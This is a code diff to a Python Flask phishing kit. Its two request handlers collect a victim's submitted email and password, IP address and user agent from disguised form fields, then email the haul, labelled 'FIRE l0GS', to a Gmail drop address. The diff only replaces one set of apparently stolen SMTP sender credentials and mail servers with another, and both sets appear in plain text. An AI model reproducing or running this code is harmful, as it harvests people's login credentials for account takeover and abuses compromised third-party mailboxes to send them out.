@@ -176,10 +176,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'vadulnou@farmaciaanamaria.ro'
-        sender_emaill = 'vadulnou'
+        sender_email = 'charlene@fordes.co.ke'
+        sender_emaill = 'charlene'
         receiver_email = 'kokofunds147@gmail.com'
-        password = 'vadulnou@1991'
+        password = 'Insurance2'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS ! 1'
@@ -198,7 +198,7 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.farmaciaanamaria.ro', 465) as server:
+        with smtplib.SMTP_SSL('mail.fordes.co.ke', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
@@ -217,10 +217,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'vadulnou@farmaciaanamaria.ro'
-        sender_emaill = 'vadulnou'
+        sender_email = 'charlene@fordes.co.ke'
+        sender_emaill = 'charlene'
         receiver_email = 'kokofunds147@gmail.com'
-        password = 'vadulnou@1991'
+        password = 'Insurance2'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS !! 2'
@@ -239,7 +239,7 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.farmaciaanamaria.ro', 465) as server:
+        with smtplib.SMTP_SSL('mail.fordes.co.ke', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
